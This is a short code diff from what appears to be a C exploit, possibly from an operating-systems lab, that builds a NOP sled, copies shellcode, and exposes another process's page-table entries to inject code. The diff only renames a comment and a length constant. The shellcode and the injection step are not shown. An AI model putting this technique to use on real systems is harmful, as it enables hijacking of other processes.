@@ -64,9 +64,9 @@ int main (int argc, char* argv[]) {
         printf("allocate error.\n");
         exit(-1);
     }
-    for (i = 0; i < 1 << 10; i++)              // page1, nop
-        ((int*)sc)[i] = 0xd503201f;            // nop opcode
-    memcpy(sc + (1 << 12), &shellcode, 0x100); // page2, shellcode
+    for (i = 0; i < 1 << 10; i++)               // page1, nop
+        ((int*)sc)[i] = 0xd503201f;             // nop opcode
+    memcpy(sc + (1 << 12), &shellcode, SC_LEN); // page2, shellcode
 
     // Expose shellcode's pte
     ptep    = expose_pte_single(getpid(), (unsigned long)sc);
@@ -75,7 +75,7 @@ int main (int argc, char* argv[]) {
     ptep[(((unsigned long)sc >> 12) % 512)]     = 0;
     ptep[(((unsigned long)sc >> 12) % 512) + 1] = 0;
 
-    // Expose sheep's pte
+    // Expose target's pte
     ptep = expose_pte_single(atoi(argv[1]), target_text_va);
 
     // Code injection
